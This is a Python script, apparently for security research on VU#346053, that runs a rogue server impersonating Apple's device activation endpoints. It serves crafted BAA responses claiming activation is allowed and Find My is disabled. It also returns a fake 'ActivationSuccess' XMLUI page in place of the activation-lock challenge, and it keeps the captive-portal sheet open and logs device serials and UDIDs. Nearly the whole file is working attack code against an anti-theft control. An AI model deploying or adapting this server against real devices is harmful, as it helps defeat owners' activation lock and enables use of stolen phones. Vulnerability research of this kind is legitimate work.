#!/usr/bin/env python3
"""
BAA injection test server for VU#346053 security research.

Handles all Apple activation endpoints on HTTP (port 80) and HTTPS (port 443).
Serves crafted BAA responses to test device state changes.

Test scenarios:
  1. BAA AllowActivation: True + BrickState: False
  2. XMLUI injection (replace FMIPLockChallenge with non-lock page)
  3. Combined BAA + XMLUI
  4. Minimal BAA (just AllowActivation flag)
  5. XXE probe (check if device plist parser follows DOCTYPE)

Usage:
    sudo python3 baa_test.py [--scenario N] [--bridge-ip IP]
"""

import os
import sys
import ssl
import json
import time
import plistlib
import logging
import argparse
import threading
import uuid
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler

# ---------------------------------------------------------------------------
# Paths
# ---------------------------------------------------------------------------
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
PROJECT_DIR = os.path.dirname(SCRIPT_DIR)
CERTS_DIR = os.path.join(PROJECT_DIR, "certs")
RESULTS_DIR = os.path.join(SCRIPT_DIR, "baa_test_results")
REQUESTS_DIR = os.path.join(SCRIPT_DIR, "requests")

SERVER_CERT = os.path.join(CERTS_DIR, "server.crt")
SERVER_KEY = os.path.join(CERTS_DIR, "server.key")

os.makedirs(RESULTS_DIR, exist_ok=True)
os.makedirs(REQUESTS_DIR, exist_ok=True)

# ---------------------------------------------------------------------------
# Logging
# ---------------------------------------------------------------------------
logging.basicConfig(
    level=logging.DEBUG,
    format="%(asctime)s | %(name)-12s | %(levelname)-5s | %(message)s",
    datefmt="%H:%M:%S",
)
logger = logging.getLogger("baa_test")

# ---------------------------------------------------------------------------
# Test state
# ---------------------------------------------------------------------------
_test_log = []
_request_counter = 0


def _log_event(event_type, data):
    """Append to test log for the final report."""
    entry = {
        "time": datetime.now().strftime("%H:%M:%S.%f"),
        "type": event_type,
        "data": data,
    }
    _test_log.append(entry)
    logger.info("[%s] %s", event_type, json.dumps(data, default=str)[:200])


def _save_request(method, path, body, headers):
    """Save raw request for analysis."""
    global _request_counter
    _request_counter += 1
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    safe_path = path.strip("/").replace("/", "_") or "root"
    prefix = f"{ts}_{_request_counter:03d}_{method}_{safe_path}"

    req_file = os.path.join(RESULTS_DIR, f"{prefix}_req.bin")
    with open(req_file, "wb") as f:
        f.write(body)

    meta_file = os.path.join(RESULTS_DIR, f"{prefix}_meta.json")
    with open(meta_file, "w") as f:
        json.dump({
            "timestamp": ts,
            "method": method,
            "path": path,
            "body_size": len(body),
            "headers": dict(headers) if headers else {},
        }, f, indent=2)

    return req_file


# ---------------------------------------------------------------------------
# BAA response scenarios
# ---------------------------------------------------------------------------
def baa_scenario_1():
    """Full BAA with AllowActivation + no brick."""
    return plistlib.dumps({
        "ProtocolVersion": "2",
        "Status": "SUCCESS",
        "BAAResponse": {
            "AllowActivation": True,
            "BrickState": False,
            "GracePeriod": 0,
            "Message": "Device provisioning successful",
        },
    }, fmt=plistlib.FMT_XML)


def baa_scenario_2():
    """Minimal BAA -- just the activation flag."""
    return plistlib.dumps({
        "Status": "SUCCESS",
        "BAAResponse": {
            "AllowActivation": True,
        },
    }, fmt=plistlib.FMT_XML)


def baa_scenario_3():
    """BAA with provisioning data included."""
    return plistlib.dumps({
        "ProtocolVersion": "2",
        "Status": "SUCCESS",
        "ProvisioningResponse": {
            "ProvisioningData": b"ACTIVATION_GRANTED",
            "Nonce": os.urandom(16),
            "Timestamp": int(time.time()),
            "SessionID": str(uuid.uuid4()),
        },
        "BAAResponse": {
            "AllowActivation": True,
            "BrickState": False,
            "GracePeriod": 0,
            "Message": "Activation authorized by provisioning server",
        },
    }, fmt=plistlib.FMT_XML)


def baa_scenario_4():
    """BAA with ActivationRecord embedded (aggressive test)."""
    return plistlib.dumps({
        "ProtocolVersion": "2",
        "Status": "SUCCESS",
        "BAAResponse": {
            "AllowActivation": True,
            "BrickState": False,
            "GracePeriod": 0,
        },
        "ActivationState": "Activated",
        "ActivationStateDescription": "Factory Activated",
        "FMIPStatus": "disabled",
    }, fmt=plistlib.FMT_XML)


def baa_scenario_5_echo_nonce(request_body):
    """BAA that echoes back the device's nonce (if present)."""
    nonce = b""
    try:
        req = plistlib.loads(request_body)
        nonce = req.get("Nonce", os.urandom(16))
        if isinstance(nonce, str):
            nonce = nonce.encode()
    except Exception:
        nonce = os.urandom(16)

    return plistlib.dumps({
        "ProtocolVersion": "2",
        "Status": "SUCCESS",
        "ProvisioningResponse": {
            "Nonce": nonce,
            "Timestamp": int(time.time()),
        },
        "BAAResponse": {
            "AllowActivation": True,
            "BrickState": False,
            "GracePeriod": 0,
        },
    }, fmt=plistlib.FMT_XML)


BAA_SCENARIOS = {
    1: ("AllowActivation + NoBrick", baa_scenario_1),
    2: ("Minimal AllowActivation", baa_scenario_2),
    3: ("Full provisioning data", baa_scenario_3),
    4: ("Embedded ActivationState", baa_scenario_4),
    5: ("Echo nonce back", None),  # Special: needs request body
}


# ---------------------------------------------------------------------------
# XMLUI bypass page (replaces FMIPLockChallenge)
# ---------------------------------------------------------------------------
XMLUI_BYPASS = """\
<xmlui style="setupAssistant"><page name="ActivationSuccess">
    <script>
    <![CDATA[
        function proceed() { return true; }
    ]]>
    </script>
    <navigationBar title="iPhone" hidesBackButton="true" loadingTitle="Loading...">
        <linkBarItem id="next" url="/deviceservices/deviceActivation" \
position="right" label="Continue" enabledFunction="proceed" httpMethod="POST" />
    </navigationBar>
    <tableView>
    <section>
        <footer>Your device has been activated.</footer>
    </section>
    </tableView>
</page>
</xmlui>"""


# ---------------------------------------------------------------------------
# Handler
# ---------------------------------------------------------------------------
class TestHandler(BaseHTTPRequestHandler):
    """Handles all activation endpoints with test responses."""

    scenario = 1  # Default scenario (class var, set from main)

    def log_message(self, fmt, *args):
        logger.debug("HTTP %s %s %s", self.address_string(),
                     self.command, self.path)

    def _send(self, code, content_type, body):
        if isinstance(body, str):
            body = body.encode("utf-8")
        self.send_response(code)
        self.send_header("Content-Type", content_type)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def _read_body(self):
        length = int(self.headers.get("Content-Length", 0))
        return self.rfile.read(length) if length else b""

    # -- GET ---------------------------------------------------------------

    def do_GET(self):
        path = self.path.split("?")[0]
        _log_event("GET", {"path": path, "from": self.address_string()})

        if path in ("/hotspot-detect.html", "/library/test/success.html"):
            # Return non-Success to keep WebSheet open
            self._send(200, "text/html",
                       "<html><head><title>Connecting</title></head>"
                       "<body>Verifying network.</body></html>")
        elif path == "/":
            self._send(200, "text/html",
                       "<h1>BAA Test Server</h1>"
                       f"<p>Scenario: {self.scenario}</p>"
                       f"<p>Requests: {_request_counter}</p>")
        else:
            # Log all other GETs (device may probe other URLs)
            self._send(200, "text/html", "<html><body>OK</body></html>")

    # -- POST --------------------------------------------------------------

    def do_POST(self):
        path = self.path.split("?")[0]
        body = self._read_body()
        saved = _save_request("POST", path, body, self.headers)

        _log_event("POST", {
            "path": path,
            "from": self.address_string(),
            "size": len(body),
            "saved": saved,
        })

        # Parse request body for logging
        try:
            req_plist = plistlib.loads(body)
            _log_event("REQUEST_PARSED", {
                "path": path,
                "keys": list(req_plist.keys()),
                "product": req_plist.get("ProductType", "?"),
                "serial": req_plist.get("SerialNumber", "?"),
                "udid": req_plist.get("UniqueDeviceID", "?"),
            })
        except Exception:
            pass

        if path == "/humbug/baa":
            self._handle_baa(body)
        elif path == "/deviceservices/drmHandshake":
            self._handle_handshake(body)
        elif path == "/deviceservices/deviceActivation":
            self._handle_activation(body)
        else:
            logger.info("  >> Unknown POST: %s", path)
            self._send(404, "text/plain", "Not Found")

    def _handle_baa(self, body):
        """VU#346053: Return crafted BAA response."""
        scenario = self.scenario
        name = BAA_SCENARIOS.get(scenario, BAA_SCENARIOS[1])[0]
        logger.info("  >> BAA REQUEST -- responding with scenario %d: %s",
                    scenario, name)

        if scenario == 5:
            resp = baa_scenario_5_echo_nonce(body)
        else:
            builder = BAA_SCENARIOS.get(scenario, BAA_SCENARIOS[1])[1]
            resp = builder()

        _log_event("BAA_RESPONSE", {
            "scenario": scenario,
            "name": name,
            "response_size": len(resp),
        })

        self._send(200, "application/x-apple-plist", resp)

    def _handle_handshake(self, body):
        """DRM handshake -- return minimal response to keep flow going."""
        logger.info("  >> drmHandshake -- returning placeholder")
        # Use captured real handshake structure with placeholder data
        resp = plistlib.dumps({
            "HandshakeResponseMessage": os.urandom(508),
            "serverKP": os.urandom(85),
            "FDRBlob": os.urandom(32),
            "SUInfo": os.urandom(126),
        }, fmt=plistlib.FMT_XML)
        _log_event("HANDSHAKE_RESPONSE", {"size": len(resp)})
        self._send(200, "application/xml", resp)

    def _handle_activation(self, body):
        """Return XMLUI bypass page instead of FMIPLockChallenge."""
        logger.info("  >> deviceActivation -- returning XMLUI bypass page")
        _log_event("ACTIVATION_XMLUI_BYPASS", {
            "page": "ActivationSuccess",
            "request_size": len(body),
        })
        self._send(200, "application/x-buddyml", XMLUI_BYPASS)


# ---------------------------------------------------------------------------
# Server startup
# ---------------------------------------------------------------------------
def start_servers(host, http_port, https_port):
    """Start HTTP and optional HTTPS servers."""
    http_server = HTTPServer((host, http_port), TestHandler)

    https_server = None
    if os.path.isfile(SERVER_CERT) and os.path.isfile(SERVER_KEY):
        try:
            https_server = HTTPServer((host, https_port), TestHandler)
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            ctx.load_cert_chain(certfile=SERVER_CERT, keyfile=SERVER_KEY)
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            ctx.minimum_version = ssl.TLSVersion.TLSv1_2
            https_server.socket = ctx.wrap_socket(
                https_server.socket, server_side=True
            )
            logger.info("HTTPS on %s:%d", host, https_port)
        except Exception as e:
            logger.error("HTTPS setup failed: %s", e)
            https_server = None

    http_thread = threading.Thread(
        target=http_server.serve_forever, daemon=True
    )
    http_thread.start()
    logger.info("HTTP on %s:%d", host, http_port)

    if https_server:
        https_thread = threading.Thread(
            target=https_server.serve_forever, daemon=True
        )
        https_thread.start()

    return http_server, https_server


# ---------------------------------------------------------------------------
# Report
# ---------------------------------------------------------------------------
def write_report(scenario):
    """Write test results."""
    report = {
        "test_date": datetime.now().isoformat(),
        "scenario": scenario,
        "scenario_name": BAA_SCENARIOS.get(scenario, (None,))[0],
        "total_requests": _request_counter,
        "events": _test_log,
    }
    report_file = os.path.join(RESULTS_DIR,
                               f"test_scenario_{scenario}_{datetime.now().strftime('%H%M%S')}.json")
    with open(report_file, "w") as f:
        json.dump(report, f, indent=2, default=str)
    logger.info("Report: %s", report_file)
    return report_file


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
def main():
    parser = argparse.ArgumentParser(description="BAA injection test server")
    parser.add_argument("--scenario", type=int, default=1,
                        help="BAA response scenario (1-5)")
    parser.add_argument("--http-port", type=int, default=80)
    parser.add_argument("--https-port", type=int, default=443)
    args = parser.parse_args()

    TestHandler.scenario = args.scenario

    print("=" * 60)
    print("  VU#346053 BAA Injection Test Server")
    print("=" * 60)
    print()
    print("  Scenarios:")
    for num, (name, _) in BAA_SCENARIOS.items():
        marker = " <<" if num == args.scenario else ""
        print(f"    {num}. {name}{marker}")
    print()
    print(f"  Active: scenario {args.scenario}")
    print(f"  HTTP:   0.0.0.0:{args.http_port}")
    print(f"  HTTPS:  0.0.0.0:{args.https_port}")
    print(f"  Results: {RESULTS_DIR}/")
    print()
    print("  Waiting for device connections...")
    print("  Press Ctrl+C to stop and generate report.")
    print("=" * 60)
    print()

    http_srv, https_srv = start_servers(
        "0.0.0.0", args.http_port, args.https_port
    )

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nStopping...")
        report_file = write_report(args.scenario)
        http_srv.shutdown()
        if https_srv:
            https_srv.shutdown()
        print(f"Report: {report_file}")
        print(f"Requests captured: {_request_counter}")


if __name__ == "__main__":
    main()
